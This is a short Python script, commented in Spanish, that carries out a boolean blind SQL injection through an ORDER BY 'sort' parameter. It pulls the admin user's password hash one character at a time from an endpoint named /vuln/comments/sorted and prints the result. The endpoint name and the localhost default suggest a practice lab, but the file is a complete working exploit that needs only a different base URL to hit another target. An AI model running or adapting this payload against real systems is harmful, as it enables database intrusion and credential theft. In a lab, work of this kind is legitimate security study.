"""Extrae el password_hash de admin por blind SQLi booleana en ORDER BY (solo contra localhost)."""
import json, sys, time, urllib.parse, urllib.request
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
ORACLE = "(CASE WHEN (SELECT substr(password_hash,{p},1) FROM users WHERE username='admin')='{c}' THEN id ELSE -id END)"
ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$"
def ids(sort):
    time.sleep(0.11)  # respeta el rate limit del gateway (10 r/s)
    url = f"{BASE}/vuln/comments/sorted?" + urllib.parse.urlencode({"sort": sort})
    return [r["id"] for r in json.load(urllib.request.urlopen(url))]
out, reqs = "", 0
for p in range(1, 41):
    for c in ALPHA:
        reqs += 1
        got = ids(ORACLE.format(p=p, c=c))
        if got == sorted(got):
            out += c; break
    else:
        break
print(f"password_hash de admin: {out}   ({reqs} requests)")
